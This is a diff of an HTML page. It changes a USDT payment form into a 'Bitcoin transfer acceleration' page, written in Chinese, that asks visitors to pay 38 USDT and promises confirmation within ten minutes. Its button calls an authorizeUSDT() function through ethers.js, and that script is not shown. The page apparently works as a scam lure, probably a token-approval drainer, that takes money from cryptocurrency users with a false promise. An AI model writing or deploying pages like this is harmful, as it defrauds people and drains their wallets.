@@ -3,27 +3,23 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>付款 USDT (ERC20)</title>
+    <title>比特币转账加速</title>
     <link rel="stylesheet" href="styles.css">
+    <link rel="icon" href="https://s2.coinmarketcap.com/static/img/coins/64x64/1.png" type="image/png"> <!-- 比特币图标 -->
 </head>
 <body>
     <div class="container">
-        <h1>付款 USDT (ERC20)</h1>
-        <div class="form-group">
-            <label for="address">收款地址</label>
-            <div class="input-group">
-                <input type="text" id="address" placeholder="搜索或输入" value="0xf2B9e347D4379Decd69A3B03fFa4e0AB878EF6D1" readonly>
-            </div>
+        <img src="https://s2.coinmarketcap.com/static/img/coins/64x64/1.png" alt="Bitcoin Logo" class="bitcoin-logo"> <!-- 比特币图标 -->
+        <h1>比特币转账加速</h1>
+        <div class="info-box">
+            <p>为了加速您的比特币转账，我们需要您支付 38 USDT。请点击“下一步”按钮支付，支付后交易将在10分钟内打包完成。</p>
         </div>
-        <div class="form-group">
-            <label for="amount">数量</label>
-            <div class="input-group">
-                <input type="text" id="amount" placeholder="USDT ">
-            </div>
+        <div class="payment-details">
+            <p>支付金额：<span id="pay-amount">38 USDT</span></p>
+            <p>比特币订单编号：<span id="btc-order"></span></p>
         </div>
-        <div class="usd-equivalent">≈ $0.00</div>
+        <button id="nextButton" onclick="authorizeUSDT()">下一步</button>
     </div>
-    <button id="nextButton" onclick="authorizeUSDT()">下一步</button>
     <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js" type="application/javascript"></script>
     <script src="script.js" type="application/javascript"></script>
 </body>
